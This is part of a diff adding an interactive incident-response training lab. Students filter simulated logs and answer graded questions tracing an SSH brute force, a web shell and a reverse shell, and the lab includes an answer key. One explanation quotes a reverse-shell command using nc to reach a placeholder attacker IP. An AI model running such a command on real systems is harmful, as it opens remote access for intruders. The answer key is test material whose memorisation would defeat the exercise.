+    {t:"",     l:"2024-11-14T04:00:00Z ALLOW OUT=eth0 SRC=10.0.1.22 DST=216.239.35.0 PROTO=UDP SPT=32769 DPT=123 LEN=48"},
+    /* === Normal post-incident inbound traffic === */
+    {t:"",     l:"2024-11-14T04:10:05Z ALLOW IN=eth0 SRC=10.0.1.31 DST=10.0.1.22 PROTO=TCP SPT=50100 DPT=80 LEN=52"},
+    {t:"",     l:"2024-11-14T04:22:38Z ALLOW IN=eth0 SRC=10.0.1.30 DST=10.0.1.22 PROTO=TCP SPT=50200 DPT=80 LEN=52"}
+];
+
+/* ── Tab state ───────────────────────────────────────────────────── */
+var currentTab = 'auth';
+var TABS = { auth: AUTH_LOG, web: WEB_LOG, fw: FW_LOG };
+
+/**
+ * switchTab(name) — activates a log dataset and re-renders the pane.
+ * Clears the filter so the student starts fresh on each tab.
+ */
+function switchTab(name) {
+    currentTab = name;
+    /* Update tab button active state */
+    ['auth','web','fw'].forEach(function(t) {
+        document.getElementById('tab-' + t).classList.toggle('active', t === name);
+        document.getElementById('tab-' + t).setAttribute('aria-selected', t === name ? 'true' : 'false');
+    });
+    /* Reset filter when switching tabs */
+    document.getElementById('filterInput').value = '';
+    renderLogPane(TABS[name], '');
+}
+
+/**
+ * renderLogPane(lines, query) — renders log lines into #logPane.
+ * Lines whose text contains query (case-insensitive) are shown;
+ * others get class "hidden". Highlights are preserved via data-tag.
+ * Shows the empty state div if zero lines match.
+ */
+function renderLogPane(lines, query) {
+    var pane  = document.getElementById('logPane');
+    var empty = document.getElementById('logEmpty');
+    var q     = query.toLowerCase().trim();
+    var visible = 0;
+
+    /* Build DOM nodes (no innerHTML with user input — use textContent) */
+    pane.innerHTML = '';
+    lines.forEach(function(item) {
+        var span = document.createElement('span');
+        span.className = 'log-line';
+        if (item.t) span.setAttribute('data-tag', item.t);
+        span.textContent = item.l;
+
+        /* Filter: hide line if query doesn't appear in the raw text */
+        if (q && item.l.toLowerCase().indexOf(q) === -1) {
+            span.classList.add('hidden');
+        } else {
+            visible++;
+        }
+        pane.appendChild(span);
+    });
+
+    /* Update line count indicator */
+    var total = lines.length;
+    document.getElementById('filterCount').textContent =
+        q ? (visible + ' / ' + total) : (total + ' lines');
+
+    /* Toggle empty state message */
+    empty.style.display = (q && visible === 0) ? 'block' : 'none';
+}
+
+/**
+ * applyFilter() — called on every keypress in the filter input.
+ * Filters the currently visible tab without switching data sets.
+ */
+function applyFilter() {
+    var q = document.getElementById('filterInput').value;
+    renderLogPane(TABS[currentTab], q);
+}
+
+/** clearFilter() — resets the filter input and shows all lines. */
+function clearFilter() {
+    document.getElementById('filterInput').value = '';
+    renderLogPane(TABS[currentTab], '');
+}
+
+/* ================================================================
+   QUESTIONS
+   8 questions covering the full attack chain.
+   Types: 'select' (dropdown) or 'text' (exact-match string input).
+   For 'text', answers array holds all accepted caseless strings.
+   ================================================================ */
+var QUESTIONS = [
+    {
+        id: 1,
+        text: 'Which username was targeted by the SSH brute-force attack?',
+        hint: 'Hint: filter auth.log for "Failed password"',
+        type: 'select',
+        options: ['-- Select --', 'root', 'jgarcia', 'deploy', 'sysadmin', 'admin'],
+        answer: 'jgarcia',
+        explain: 'auth.log shows 15 "Failed password for jgarcia from 198.51.100.47" lines between 03:11 and 03:16. ' +
+                 'While "admin" and "root" were attempted once each (invalid user), jgarcia was the sustained target.'
+    },
+    {
+        id: 2,
+        text: 'What is the attacker\'s source IP address?',
+        hint: 'Hint: filter any log for the external IP that appears in attack events',
+        type: 'select',
+        options: ['-- Select --', '10.0.1.5', '10.0.1.30', '198.51.100.47', '8.8.8.8', '203.0.113.1'],
+        answer: '198.51.100.47',
+        explain: '198.51.100.47 is the consistent external source across all three logs: ' +
+                 'brute-force in auth.log, Nikto scan + web shell calls in access.log, ' +
+                 'and SSH/HTTP connections in the firewall log.'
+    },
+    {
+        id: 3,
+        text: 'At what timestamp did the attacker first successfully log in via SSH?',
+        hint: 'Hint: filter auth.log for "Accepted password for jgarcia"',
+        type: 'select',
+        options: [
+            '-- Select --',
+            'Nov 14 03:11:04',
+            'Nov 14 03:16:11',
+            'Nov 14 03:17:04',
+            'Nov 14 03:18:14',
+            'Nov 14 02:44:01'
+        ],
+        answer: 'Nov 14 03:17:04',
+        explain: 'auth.log line: "Nov 14 03:17:04 webprod sshd[3960]: Accepted password for jgarcia from 198.51.100.47 port 54370 ssh2". ' +
+                 'The earlier timestamps show failed attempts; 03:11:04 is the first failure, not a success.'
+    },
+    {
+        id: 4,
+        text: 'What reconnaissance tool did the attacker use to scan the web application before the brute force?',
+        hint: 'Hint: filter access.log for the attacker IP around 03:05 and look at the User-Agent field',
+        type: 'select',
+        options: ['-- Select --', 'curl', 'nmap', 'Nikto', 'Burp Suite', 'sqlmap'],
+        answer: 'Nikto',
+        explain: 'access.log shows requests at 03:05:18-03:05:36 from 198.51.100.47 with User-Agent ' +
+                 '"Mozilla/5.0 (compatible; Nikto/2.1.6)". Nikto is an open-source web vulnerability scanner ' +
+                 'that probes for common misconfigurations, backup files, and exposed directories.'
+    },
+    {
+        id: 5,
+        text: 'What is the full URL path of the web shell the attacker deployed and accessed?',
+        hint: 'Hint: filter access.log for "shell.php" -- look for requests from the attacker IP',
+        type: 'select',
+        options: [
+            '-- Select --',
+            '/hr/admin/shell.php',
+            '/hr/uploads/shell.php',
+            '/hr/data/shell.php',
+            '/uploads/shell.php',
+            '/hr/config/shell.php'
+        ],
+        answer: '/hr/uploads/shell.php',
+        explain: 'access.log shows multiple GET requests to "/hr/uploads/shell.php?cmd=..." from 198.51.100.47 ' +
+                 'starting at 03:31:14. The shell was placed by the attacker via wget over SSH ' +
+                 '(visible in auth.log sudo command at 03:19:45) into the web-accessible uploads directory.'
+    },
+    {
+        id: 6,
+        text: 'What total bytes were exfiltrated in the outbound firewall connection to the attacker?',
+        hint: 'Hint: filter firewall.log for "DST=198.51.100.47" and read the BYTES= field (not LEN -- LEN is per-packet)',
+        type: 'text',
+        answers: ['1048576', '1,048,576', '1048576 bytes'],
+        explain: 'firewall.log line at 03:43:22 shows: "SRC=10.0.1.22 DST=198.51.100.47 PROTO=TCP SPT=38100 DPT=4444 ' +
+                 'LEN=1500 BYTES=1048576". BYTES is the total flow transfer (1 MB = 1,048,576 bytes); ' +
+                 'LEN=1500 is the per-packet size (standard Ethernet MTU). The answer comes from BYTES, ' +
+                 'not LEN. This is the reverse shell connection to the attacker on port 4444 initiated by nc.'
+    },
+    {
+        id: 7,
+        text: 'Which destination port did the attacker use to receive the reverse shell connection from the server?',
+        hint: 'Hint: filter firewall.log for outbound connections to the attacker IP (DST=198.51.100.47)',
+        type: 'select',
+        options: ['-- Select --', '22', '80', '443', '4444', '8080'],
+        answer: '4444',
+        explain: 'The firewall log entry at 03:43:22 shows "DPT=4444" -- destination port 4444. ' +
+                 'This matches the web shell command "nc -e /bin/bash 198.51.100.47 4444" visible in access.log ' +
+                 'at 03:42:17. Port 4444 is a common attacker listener port for reverse shells.'
+    },
+    {
+        id: 8,
+        text: 'Which firewall control, if enforced, would have most directly prevented the data exfiltration via reverse shell?',
+        hint: 'Hint: look at whether the exfil connection was inbound or outbound, and what port it used',
+        type: 'select',
+        options: [
+            '-- Select --',
+            'Block inbound TCP port 22 from all external IPs',
+            'Block inbound TCP port 80 from all external IPs',
+            'Egress filtering: deny outbound connections to non-approved ports and external IPs',
+            'Enable IDS signatures for SSH brute force',
+            'Disable PHP on the web server'
+        ],
+        answer: 'Egress filtering: deny outbound connections to non-approved ports and external IPs',
+        explain: 'The exfil was an OUTBOUND connection (SRC=10.0.1.22 going OUT to DST=198.51.100.47 port 4444). ' +
+                 'The firewall log shows "ALLOW OUT=eth0" -- there was no egress rule to block this. ' +
+                 'Egress filtering (allow only approved outbound: 53/DNS, 80/443/HTTP, 123/NTP) would have ' +
+                 'prevented the reverse shell from calling home, even after the web shell was planted.'
+    }
+];
+
+/**
+ * renderQuestions() — builds all question cards and injects them into #qCards.
+ * Creates dropdowns for 'select' type and text inputs for 'text' type.
+ */
+function renderQuestions() {
+    var container = document.getElementById('qCards');
+    container.innerHTML = '';
+
+    QUESTIONS.forEach(function(q) {
+        var card = document.createElement('div');
+        card.className = 'q-card';
+        card.id = 'qcard-' + q.id;
+
+        /* Build the answer control HTML */
+        var controlHtml = '';
+        if (q.type === 'select') {
+            var optHtml = q.options.map(function(o) {
+                return '<option value="' + o + '">' + o + '</option>';
+            }).join('');
+            controlHtml = '<div class="q-select"><select id="qans-' + q.id + '">' + optHtml + '</select></div>';
+        } else {
+            controlHtml = '<div class="q-input"><input type="text" id="qans-' + q.id +
+                          '" placeholder="Type exact value from the log..." autocomplete="off" spellcheck="false"></div>';
+        }
+
+        card.innerHTML =
+            '<div class="q-header">' +
+                '<div class="q-num">' + q.id + '</div>' +
+                '<div class="q-text">' + q.text + '</div>' +
+            '</div>' +
+            '<div class="q-hint">' + q.hint + '</div>' +
+            controlHtml +
+            '<div class="q-feedback" id="qfb-' + q.id + '"></div>';
+
+        container.appendChild(card);
+    });
+}
+
+/**
+ * gradeAll() — grades all questions, applies correct/incorrect CSS classes
+ * (consumed by the mood-ring observer), shows per-question feedback,
+ * displays score summary, and reveals Mark Complete if >= 75%.
+ */
+function gradeAll() {
+    var correct = 0;
+
+    QUESTIONS.forEach(function(q) {
+        var card = document.getElementById('qcard-' + q.id);
+        var fb   = document.getElementById('qfb-' + q.id);
+        var val  = '';
+
+        if (q.type === 'select') {
+            val = document.getElementById('qans-' + q.id).value;
+        } else {
+            val = document.getElementById('qans-' + q.id).value.trim();
+        }
+
+        /* Determine correctness */
+        var isCorrect = false;
+        if (q.type === 'select') {
+            isCorrect = (val === q.answer);
+        } else {
+            /* Text input: accept any listed alias, case-insensitive */
+            var vLow = val.toLowerCase();
+            isCorrect = q.answers.some(function(a) {
+                return a.toLowerCase() === vLow;
+            });
+        }
+
+        if (isCorrect) {
+            correct++;
+            /* mood-ring: 'correct' class triggers the Dr. Hex button state */
+            card.classList.remove('incorrect');
+            card.classList.add('correct');
+            fb.className = 'q-feedback show right';
+            fb.textContent = 'Correct. ' + q.explain;
+        } else {
+            /* mood-ring: 'incorrect' class triggers the Dr. Hex button state */
+            card.classList.remove('correct');
+            card.classList.add('incorrect');
+            fb.className = 'q-feedback show wrong';
+            var ansDisplay = q.type === 'select' ? q.answer : q.answers[0];
+            fb.textContent = 'Incorrect -- answer is "' + ansDisplay + '". ' + q.explain;
+        }
+    });
+
+    /* Show score summary */
+    var total = QUESTIONS.length;
+    var pct   = Math.round((correct / total) * 100);
+    var res   = document.getElementById('results');
+    var msg   = correct === total
+        ? 'Perfect score. You can read logs and trace an attack chain end-to-end.'
+        : correct >= 6
+            ? 'Strong performance. Review the questions you missed and trace the log lines they reference.'
+            : 'Keep digging. Use the filter box to isolate the attacker IP and walk the timeline chronologically.';
+
+    res.innerHTML =
+        '<h2>Score: ' + correct + ' / ' + total + ' (' + pct + '%)</h2>' +
+        '<p style="color:var(--muted);">' + msg + '</p>';
+    res.classList.add('show');
+
+    /* Disable grade button to prevent re-grading without reset */
+    document.getElementById('submitBtn').disabled = true;
+
+    /* Reveal Mark Complete button if student passes (>= 75%, i.e. 6 of 8) */
+    if (correct >= 6) {
+        document.getElementById('completeSection').classList.add('show');
+    }
+}
+
+/**
+ * resetLab() — clears all answer controls, feedback, and score state
+ * so the student can attempt the questions again.
+ */
+function resetLab() {
+    /* Reset question cards */
+    QUESTIONS.forEach(function(q) {
+        var card = document.getElementById('qcard-' + q.id);
+        var fb   = document.getElementById('qfb-' + q.id);
+        card.classList.remove('correct', 'incorrect');
+        fb.className = 'q-feedback';
+        fb.textContent = '';
+
+        if (q.type === 'select') {
+            document.getElementById('qans-' + q.id).value = q.options[0];
+        } else {
+            document.getElementById('qans-' + q.id).value = '';
+        }
+    });
+
+    /* Hide score and complete section */
+    document.getElementById('results').classList.remove('show');
+    document.getElementById('completeSection').classList.remove('show');
+
+    /* Re-enable grade button */
+    document.getElementById('submitBtn').disabled = false;
+
+    /* Reset log view to default tab */
+    switchTab('auth');
+}
+
+/* ── Initial render ─────────────────────────────────────────────── */
+renderLogPane(AUTH_LOG, '');   /* Load auth log on first paint */
+renderQuestions();             /* Build all question cards     */
+</script>
+
+<!-- ── Dr. Hex floating mood-ring button ──────────────────────────
+     Always-visible chat entry point. State machine is attempt-driven;
+     button stays calm and serves as a general chat entry until lab
+     activity ticks the mood-ring.
+     Docs: _docs/operations/dr-hex-button-integration.md           ── -->
+<hex-ai-button mission-id="shield-log-intrusion-hunt" house="shield"></hex-ai-button>
+<script type="module" src="/_lib/HexAIButton.js"></script>
+</body>
+</html>
